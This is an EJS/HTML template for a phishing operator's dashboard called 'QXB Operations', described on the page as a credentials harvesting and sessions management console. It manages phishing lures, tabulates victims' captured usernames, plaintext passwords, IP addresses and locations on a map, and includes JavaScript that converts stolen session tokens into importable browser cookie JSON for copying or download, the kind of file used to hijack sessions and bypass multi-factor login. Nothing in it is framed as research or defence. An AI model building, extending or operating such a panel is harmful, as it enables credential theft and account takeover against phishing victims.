<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>QXB Operations Console</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=" crossorigin=""></script>
    <link rel="stylesheet" href="/css/cyber.css">
    
    <style>
        .dashboard-container {
            max-width: 1300px;
            margin: 0 auto;
            padding: 40px 20px;
            width: 100%;
        }

        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo-img {
            width: 48px;
            height: 48px;
            filter: drop-shadow(0 0 10px var(--accent-cyan-glow));
        }

        .header-title {
            font-size: 1.75rem;
            background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--accent-purple) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header-subtitle {
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin-top: 2px;
        }

        .header-actions {
            display: flex;
            gap: 12px;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 32px;
        }

        @media (max-width: 1024px) {
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        @media (max-width: 640px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }

        .stat-card {
            padding: 24px;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 120px;
        }

        .stat-card::after {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 80px;
            height: 80px;
            background: radial-gradient(circle, var(--accent-color-glow) 0%, transparent 70%);
            z-index: 0;
            pointer-events: none;
            opacity: 0.6;
        }

        .stat-value {
            font-size: 2.25rem;
            font-weight: 800;
            line-height: 1.2;
            z-index: 1;
            font-feature-settings: "tnum";
        }

        .stat-label {
            font-size: 0.8rem;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-top: 8px;
            z-index: 1;
        }

        /* Section Layout */
        .dashboard-section {
            margin-bottom: 32px;
            padding: 24px;
        }

        .section-title-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .section-heading {
            font-size: 1.15rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* Leaflet Dark Map */
        #map {
            width: 100%;
            height: 380px;
            border-radius: 12px;
            border: 1px solid var(--border-glow);
            z-index: 1;
        }

        /* Responsive Table */
        .table-responsive {
            width: 100%;
            overflow-x: auto;
        }

        .btn-action-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 34px;
            height: 34px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.02);
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-action-icon:hover {
            background: rgba(0, 242, 254, 0.1);
            border-color: var(--accent-cyan);
            color: var(--accent-cyan);
            box-shadow: 0 0 10px var(--accent-cyan-glow);
        }

        .btn-action-icon.danger:hover {
            background: rgba(255, 0, 85, 0.1);
            border-color: var(--accent-danger);
            color: var(--accent-danger);
            box-shadow: 0 0 10px var(--accent-danger-glow);
        }

        .password-field {
            font-family: monospace;
            font-size: 0.85rem;
            color: var(--accent-cyan);
            background: rgba(0, 242, 254, 0.05);
            border: 1px solid rgba(0, 242, 254, 0.1);
            padding: 4px 10px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-block;
            max-width: 160px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .password-field:hover {
            background: rgba(0, 242, 254, 0.15);
            border-color: var(--accent-cyan);
            box-shadow: 0 0 8px var(--accent-cyan-glow);
        }

        /* Modal details */
        .modal-details {
            display: flex;
            flex-direction: column;
            gap: 12px;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .detail-row {
            display: flex;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            padding-bottom: 8px;
        }

        .detail-label {
            width: 140px;
            font-weight: 600;
            color: var(--text-secondary);
        }

        .detail-val {
            color: var(--text-primary);
            word-break: break-all;
        }
    </style>
</head>

<body>
    <div class="dashboard-container">
        <!-- Header -->
        <header class="dashboard-header">
            <div class="header-left">
                <img src="https://fuchsia-quickest-kite-522.mypinata.cloud/ipfs/bafkreifxytn5dxnfaj2thdcpj3n7ltoufvhipekdpvijspsc6lg66m5e3m" alt="QXB" class="logo-img" />
                <div>
                    <h1 class="header-title glow-text">QXB Operations</h1>
                    <p class="header-subtitle">Credentials harvesting & sessions management console</p>
                </div>
            </div>
            <div class="header-actions">
                <a href="/settings" class="btn btn-outline">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="12" cy="12" r="3"/>
                        <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
                    </svg>
                    Settings
                </a>
                <form action="/logout" method="POST" style="display:inline;">
                    <button type="submit" class="btn btn-danger">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"/>
                        </svg>
                        Logout
                    </button>
                </form>
            </div>
        </header>

        <!-- Toast Container for Balloons -->
        <div class="toast-container">
            <% if (messages && messages.success) { %>
                <div class="toast success" id="successToast">
                    <span style="font-size: 1.25rem;">✨</span>
                    <div><%= messages.success %></div>
                </div>
            <% } %>
            <% if (messages && messages.error) { %>
                <div class="toast error" id="errorToast">
                    <span style="font-size: 1.25rem;">⚠️</span>
                    <div><%= messages.error %></div>
                </div>
            <% } %>
        </div>

        <% 
            const validData = data.filter(item => {
                const user = item.username || item.email || '';
                return user && user.toLowerCase() !== 'unknown';
            });

            const sessions = validData.filter(d => d.tokens || d.cookies);
            
            function parseBrowser(ua) {
                if (!ua) return 'Unknown';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edge')) return 'Edge';
                return 'Other';
            }
            function parseDevice(ua) {
                if (!ua) return 'Unknown';
                if (ua.includes('Windows')) return 'Windows';
                if (ua.includes('Mac')) return 'macOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Linux')) return 'Linux';
                return 'Other';
            }
        %>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card glass-panel" style="--accent-color-glow: var(--accent-danger-glow);">
                <div class="stat-value" style="color: var(--accent-danger); text-shadow: 0 0 15px var(--accent-danger-glow);">
                    <%= validData.length %>
                </div>
                <div class="stat-label">Credentials Captured</div>
            </div>
            
            <div class="stat-card glass-panel" style="--accent-color-glow: var(--accent-purple-glow);">
                <div class="stat-value" style="color: var(--accent-purple); text-shadow: 0 0 15px var(--accent-purple-glow);">
                    <%= typeof lures !== 'undefined' ? lures.length : 0 %>
                </div>
                <div class="stat-label">Active Lures</div>
            </div>
            
            <div class="stat-card glass-panel" style="--accent-color-glow: var(--accent-success-glow);">
                <div class="stat-value" style="color: var(--accent-success); text-shadow: 0 0 15px var(--accent-success-glow);">
                    <%= sessions.length %>
                </div>
                <div class="stat-label">Sessions Extracted</div>
            </div>

            <div class="stat-card glass-panel" style="--accent-color-glow: var(--accent-cyan-glow);">
                <div class="stat-value" style="color: var(--accent-cyan); text-shadow: 0 0 15px var(--accent-cyan-glow);">
                    <%= data.length %>
                </div>
                <div class="stat-label">Total Visitors</div>
            </div>
        </div>

        <!-- Map View -->
        <div class="dashboard-section glass-panel">
            <div class="section-title-bar">
                <h2 class="section-heading">
                    <span style="color: var(--accent-cyan);">🌎</span> Global Capture Map
                </h2>
            </div>
            <div id="map"></div>
        </div>

        <!-- Active Lures Table -->
        <div class="dashboard-section glass-panel">
            <div class="section-title-bar">
                <h2 class="section-heading">
                    <span style="color: var(--accent-purple);">🔗</span> Active Lures
                </h2>
                <a href="/settings" class="btn btn-cyan" style="padding: 8px 16px; font-size: 0.8rem;">Add Lure</a>
            </div>
            <div class="table-responsive">
                <table class="cyber-table">
                    <thead>
                        <tr>
                            <th>Project</th>
                            <th>Target URL</th>
                            <th>Redirect URL</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% if (typeof lures === 'undefined' || lures.length === 0) { %>
                            <tr>
                                <td colspan="4" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    No lures configured.
                                </td>
                            </tr>
                        <% } else { %>
                            <% lures.forEach(function(lure, index) { %>
                            <tr>
                                <td>
                                    <span class="badge badge-purple"><%= lure.phishlet %></span>
                                </td>
                                <td>
                                    <span class="password-field" style="max-width: 320px; cursor: default;" title="<%= lure.exact_url %>">
                                        <%= lure.exact_url.split('?')[0] %>
                                    </span>
                                </td>
                                <td style="color: var(--text-secondary);">
                                    <%= lure.redirect_url || "default" %>
                                </td>
                                <td>
                                    <div style="display: flex; gap: 8px;">
                                        <button class="btn-action-icon" title="Copy URL" onclick="copyLureUrl('<%= lure.exact_url %>')">
                                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                                            </svg>
                                        </button>
                                        <form action="/delete-lure" method="POST" style="display:inline;" onsubmit="return confirm('Delete this lure?');">
                                            <input type="hidden" name="index" value="<%= index %>">
                                            <button type="submit" class="btn-action-icon danger" title="Delete Lure">
                                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                    <polyline points="3 6 5 6 21 6"></polyline>
                                                    <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                                                </svg>
                                            </button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                            <% }); %>
                        <% } %>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Credentials Table -->
        <div class="dashboard-section glass-panel">
            <div class="section-title-bar">
                <h2 class="section-heading">
                    <span style="color: var(--accent-danger);">🔑</span> Captured Credentials
                </h2>
                <button class="btn btn-cyan" onclick="window.location.reload()" style="padding: 8px 16px; font-size: 0.8rem;">Refresh</button>
            </div>
            <div class="table-responsive">
                <table class="cyber-table">
                    <thead>
                        <tr>
                            <th>Email/Username</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>Country</th>
                            <th>Browser</th>
                            <th>Device</th>
                            <th>Captured At</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% if (validData.length === 0) { %>
                            <tr>
                                <td colspan="7" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    No credentials captured yet.
                                </td>
                            </tr>
                        <% } else { %>
                            <% validData.forEach(function(item, index) { 
                                const dateStr = item.create_time ? new Date(item.create_time * 1000).toLocaleString() : (item.time || "Just now"); 
                            %>
                            <tr>
                                <td>
                                    <div style="font-weight: 600; color: var(--text-primary); cursor: pointer;" onclick="copyText(this)" title="Click to copy">
                                        <%= item.username || item.email %>
                                    </div>
                                </td>
                                <td>
                                    <span class="password-field" onclick="copyText(this)" title="Click to copy">
                                        <%= item.password || "***" %>
                                    </span>
                                </td>
                                <td style="font-family: monospace; color: var(--text-secondary);">
                                    <%= item.remote_addr || item.remote_ip || "N/A" %>
                                </td>
                                <td id="country-<%= index %>" style="color: var(--text-primary);">
                                    Loading...
                                </td>
                                <td style="color: var(--text-secondary);">
                                    <%= parseBrowser(item.useragent) %>
                                </td>
                                <td style="color: var(--text-secondary);">
                                    <%= parseDevice(item.useragent) %>
                                </td>
                                <td style="color: var(--text-muted); font-size: 0.8rem;">
                                    <%= dateStr %>
                                </td>
                            </tr>
                            <% }); %>
                        <% } %>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Captured Sessions Table -->
        <div class="dashboard-section glass-panel">
            <div class="section-title-bar">
                <h2 class="section-heading">
                    <span style="color: var(--accent-success);">🍪</span> Captured Sessions
                </h2>
            </div>
            <div class="table-responsive">
                <table class="cyber-table">
                    <thead>
                        <tr>
                            <th>Email/Username</th>
                            <th>Cookie Count</th>
                            <th>Auth Tokens</th>
                            <th>Extracted At</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <% if (sessions.length === 0) { %>
                            <tr>
                                <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
                                    No cookie/token sessions captured yet.
                                </td>
                            </tr>
                        <% } else { %>
                            <% sessions.forEach(function(item) { 
                                let cookieCount = 0;
                                if (item.tokens) {
                                    for (const domain in item.tokens) {
                                        if (item.tokens[domain]) {
                                            cookieCount += Object.keys(item.tokens[domain]).length;
                                        }
                                    }
                                }
                                if (item.cookies) {
                                    if (Array.isArray(item.cookies)) {
                                        cookieCount += item.cookies.length;
                                    } else {
                                        cookieCount += Object.keys(item.cookies).length;
                                    }
                                }
                                const tokenCount = item.tokens ? Object.keys(item.tokens).length : 0; 
                                const dateStr = item.create_time ? new Date(item.create_time * 1000).toLocaleString() : (item.time || "Just now"); 
                            %>
                            <tr>
                                <td>
                                    <div style="font-weight: 600; color: var(--text-primary); cursor: pointer;" onclick="copyText(this)" title="Click to copy">
                                        <%= item.username || item.email %>
                                    </div>
                                </td>
                                <td>
                                    <span class="badge badge-cyan"><%= cookieCount %> Cookies</span>
                                </td>
                                <td>
                                    <span class="badge <%= tokenCount > 0 ? 'badge-success' : 'badge-purple' %>"><%= tokenCount %> Tokens</span>
                                </td>
                                <td>
                                    <%= dateStr %>
                                </td>
                                <td>
                                    <div style="display: flex; gap: 8px;">
                                        <button class="btn-action-icon" title="View Session Details" onclick='showSessionModal(<%= JSON.stringify(item) %>)'>
                                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                                <circle cx="12" cy="12" r="3" />
                                            </svg>
                                        </button>
                                        <button class="btn-action-icon" title="Copy Cookies JSON" onclick='copySessionData(<%= JSON.stringify(item) %>)'>
                                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                                            </svg>
                                        </button>
                                        <button class="btn-action-icon" title="Download Cookies" onclick='downloadSessionData(<%= JSON.stringify(item) %>)'>
                                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                                                <polyline points="7 10 12 15 17 10" />
                                                <line x1="12" y1="15" x2="12" y2="3" />
                                            </svg>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                            <% }); %>
                        <% } %>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Session Modal -->
    <div class="modal-overlay" id="sessionModal">
        <div class="modal glass-panel">
            <h3 class="glow-text" style="margin-bottom: 20px; font-size: 1.25rem;">Session Details</h3>
            <div class="modal-details" id="sessionSummary" style="margin-bottom: 24px;"></div>

            <h4 style="color: var(--accent-purple); font-size: 0.95rem; margin-bottom: 12px; font-weight: 600;">🍪 Session JSON Content</h4>
            <div id="sessionContent" style="font-family: monospace; font-size: 0.8rem; white-space: pre-wrap; word-break: break-all; color: var(--text-secondary); max-height: 250px; overflow-y: auto; background: var(--bg-input); padding: 16px; border-radius: 8px; border: 1px solid var(--border-glow);"></div>

            <div style="margin-top: 24px; display: flex; justify-content: flex-end; gap: 12px;">
                <button class="btn btn-outline" onclick="document.getElementById('sessionModal').classList.remove('active')">Close</button>
                <button class="btn btn-cyan" onclick="copySessionContent()">Copy All</button>
            </div>
        </div>
    </div>

    <script>
        let currentSessionItem = null;

        function convertTokensToCookiesArray(item) {
            const cookiesArray = [];
            if (!item) return cookiesArray;

            // Support item.tokens
            if (item.tokens) {
                for (const [domain, cookieMap] of Object.entries(item.tokens)) {
                    if (!cookieMap) continue;
                    for (const [cookieName, tokenObj] of Object.entries(cookieMap)) {
                        if (!tokenObj) continue;
                        const hasDot = domain.startsWith('.');
                        cookiesArray.push({
                            domain: domain,
                            expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 3600,
                            hostOnly: !hasDot,
                            httpOnly: tokenObj.HttpOnly || false,
                            name: tokenObj.Name || cookieName,
                            path: tokenObj.Path || '/',
                            sameSite: "no_restriction",
                            secure: true,
                            session: false,
                            storeId: "0",
                            value: tokenObj.Value || ''
                        });
                    }
                }
            }
            
            // Support item.cookies (if present as array or map)
            if (item.cookies) {
                if (Array.isArray(item.cookies)) {
                    item.cookies.forEach(c => {
                        if (c && c.name) cookiesArray.push(c);
                    });
                } else {
                    for (const [cookieName, cObj] of Object.entries(item.cookies)) {
                        if (!cObj) continue;
                        cookiesArray.push({
                            domain: cObj.domain || '',
                            expirationDate: cObj.expirationDate || (Math.floor(Date.now() / 1000) + 365 * 24 * 3600),
                            hostOnly: cObj.hostOnly !== undefined ? cObj.hostOnly : !cObj.domain.startsWith('.'),
                            httpOnly: cObj.httpOnly || false,
                            name: cObj.name || cookieName,
                            path: cObj.path || '/',
                            sameSite: cObj.sameSite || "no_restriction",
                            secure: cObj.secure !== undefined ? cObj.secure : true,
                            session: cObj.session || false,
                            storeId: cObj.storeId || "0",
                            value: cObj.value || ''
                        });
                    }
                }
            }
            
            return cookiesArray;
        }

        function showSessionModal(item) {
            currentSessionItem = item;

            const cleanCookies = convertTokensToCookiesArray(item);
            const cookieCount = cleanCookies.length;
            const tokenCount = item.tokens ? Object.keys(item.tokens).length : 0;
            const dateStr = item.create_time ? new Date(item.create_time * 1000).toLocaleString() : 'N/A';

            const summaryHTML = `
                <div class="detail-row"><span class="detail-label">Username:</span><span class="detail-val">${item.username || item.email || 'Unknown'}</span></div>
                <div class="detail-row"><span class="detail-label">IP Address:</span><span class="detail-val">${item.remote_addr || item.remote_ip || 'N/A'}</span></div>
                <div class="detail-row"><span class="detail-label">User Agent:</span><span class="detail-val">${item.useragent ? parseUA(item.useragent) : 'Unknown'}</span></div>
                <div class="detail-row"><span class="detail-label">Capture Date:</span><span class="detail-val">${dateStr}</span></div>
                <div class="detail-row"><span class="detail-label">Session ID:</span><span class="detail-val">${item.id || item.sessionId || 'N/A'}</span></div>
                <div class="detail-row"><span class="detail-label">Total Cookies:</span><span class="detail-val"><span class="badge badge-cyan">${cookieCount}</span></span></div>
                <div class="detail-row"><span class="detail-label">Auth Domains:</span><span class="detail-val"><span class="badge badge-success">${tokenCount}</span></span></div>
            `;
            document.getElementById('sessionSummary').innerHTML = summaryHTML;

            const cookiesJson = JSON.stringify(cleanCookies, null, 2);
            document.getElementById('sessionContent').textContent = cookiesJson || "No session data available.";
            document.getElementById('sessionModal').classList.add('active');
        }

        function copySessionContent() {
            const content = document.getElementById('sessionContent').textContent;
            if (content) {
                copyString(content);
                alert("Cookies copied to clipboard!");
            }
        }

        function copySessionData(item) {
            const cleanCookies = convertTokensToCookiesArray(item);
            const dataToCopy = JSON.stringify(cleanCookies, null, 2);
            copyString(dataToCopy);
            alert("Cookies JSON copied to clipboard!");
        }

        function downloadSessionData(item) {
            const cleanCookies = convertTokensToCookiesArray(item);
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(cleanCookies, null, 2));
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            const filename = "cookies_" + (item.username || "unknown") + ".json";
            downloadAnchorNode.setAttribute("download", filename);
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();
        }

        function copyText(element) {
            const text = element.innerText || element.textContent;
            if (text && text.trim() !== '***') {
                copyString(text.trim(), element);
            }
        }
        
        function copyLureUrl(url) {
            copyString(url, null);
            alert("Lure URL copied to clipboard!");
        }
        
        function copyString(text, element) {
            const copyToClipboard = (str) => {
                if (navigator.clipboard && window.isSecureContext) {
                    return navigator.clipboard.writeText(str);
                } else {
                    let textArea = document.createElement("textarea");
                    textArea.value = str;
                    textArea.style.position = "fixed";
                    textArea.style.left = "-999999px";
                    textArea.style.top = "-999999px";
                    document.body.appendChild(textArea);
                    textArea.focus();
                    textArea.select();
                    return new Promise((res, rej) => {
                        document.execCommand('copy') ? res() : rej();
                        textArea.remove();
                    });
                }
            };

            copyToClipboard(text).then(() => {
                if (element) {
                    const originalColor = element.style.color;
                    element.style.color = 'var(--accent-cyan)';
                    setTimeout(() => {
                        element.style.color = originalColor;
                    }, 250);
                }
            }).catch(err => {
                console.error('Failed to copy: ', err);
                alert("Could not copy automatically. Please select and copy manually.");
            });
        }

        function parseUA(ua) {
            if (!ua) return "Unknown";
            if (ua.includes("Windows")) return "Windows";
            if (ua.includes("Mac")) return "macOS";
            if (ua.includes("Android")) return "Android";
            if (ua.includes("iPhone")) return "iOS";
            return "Other";
        }

        // --- MAP AND GEO LOGIC ---
        const capturesForMap = <%- JSON.stringify(validData.map((item, index) => ({
            id: "country-" + index,
            ip: item.remote_addr || item.remote_ip || '',
            email: item.username || item.email || ''
        }))) %>;

        // Initialize CartoDB Dark Matter map (looks great on dark themes)
        const map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
            attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
            subdomains: 'abcd',
            maxZoom: 20
        }).addTo(map);

        const ipCache = {};

        async function processMapData() {
            for (const item of capturesForMap) {
                if (!item.ip || item.ip === 'N/A' || item.ip === '127.0.0.1' || item.ip === 'localhost') {
                    const el = document.getElementById(item.id);
                    if(el) el.textContent = 'Local/Unknown';
                    continue;
                }

                try {
                    let geo = ipCache[item.ip];
                    if (!geo) {
                        const res = await fetch(`https://get.geojs.io/v1/ip/geo/${item.ip}.json`);
                        geo = await res.json();
                        ipCache[item.ip] = geo;
                    }

                    if (geo && geo.country) {
                        const el = document.getElementById(item.id);
                        if (el) {
                            el.innerHTML = `<img src="https://flagcdn.com/16x12/${geo.country_code.toLowerCase()}.png" alt="${geo.country}" style="vertical-align: middle; margin-right: 6px; border-radius: 2px;"> ${geo.country}`;
                        }

                        if (geo.latitude && geo.longitude) {
                            const marker = L.circleMarker([geo.latitude, geo.longitude], {
                                radius: 8,
                                fillColor: '#00f2fe',
                                color: '#9d4edd',
                                weight: 2,
                                opacity: 1,
                                fillOpacity: 0.8
                            }).addTo(map);
                            
                            const popupContent = `
                                <div style="color: #000; padding: 4px; font-family: sans-serif;">
                                    <strong style="color: #9d4edd; font-size: 13px;">${item.email}</strong><br>
                                    <span style="font-size: 11px; color: #555;">IP: ${item.ip}</span><br>
                                    <span style="font-size: 11px; color: #555;">Loc: ${geo.country}</span>
                                </div>
                            `;
                            marker.bindPopup(popupContent);
                        }
                    } else {
                        const el = document.getElementById(item.id);
                        if(el) el.textContent = 'Unknown';
                    }
                } catch (e) {
                    const el = document.getElementById(item.id);
                    if(el) el.textContent = 'Error';
                }

                await new Promise(r => setTimeout(r, 100));
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            processMapData();
            
            // Toast Auto-Dismiss
            const successToast = document.getElementById('successToast');
            const errorToast = document.getElementById('errorToast');
            
            if (successToast) {
                setTimeout(() => successToast.classList.add('show'), 100);
                setTimeout(() => {
                    successToast.classList.remove('show');
                    setTimeout(() => successToast.remove(), 400);
                }, 5000);
            }
            if (errorToast) {
                setTimeout(() => errorToast.classList.add('show'), 100);
                setTimeout(() => {
                    errorToast.classList.remove('show');
                    setTimeout(() => errorToast.remove(), 400);
                }, 5000);
            }
        });
    </script>
</body>

</html>